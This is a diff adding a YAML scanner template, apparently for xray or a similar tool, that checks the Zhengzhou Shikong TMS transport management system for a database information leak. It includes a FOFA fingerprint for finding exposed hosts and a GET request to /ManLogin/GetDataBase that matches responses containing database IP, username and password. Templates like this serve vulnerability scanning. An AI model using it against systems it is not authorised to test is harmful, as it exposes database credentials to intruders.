@@ -1,0 +1,16 @@
+id: poc-yaml-zzskzy-tms-getdatabase-info-leak
+info:
+  name: 郑州时空 TMS运输管理系统 GetDataBase 信息泄露漏洞
+  severity: medium
+  tags:
+  - 信息泄露
+  finger: TMS运输管理系统
+  fofa: body="/Images/ManLogin/name.png"
+requests:
+- method: GET
+  path: /ManLogin/GetDataBase
+  expression: status_code == 200 && contains(body,"\"ip\":") && contains(body,"\"dataname\":")
+    && contains(body,"\"datausername\":") && contains(body,"\"datauserpwd\":") &&
+    !contains(body,"<")
+variables: {}
+transport: http
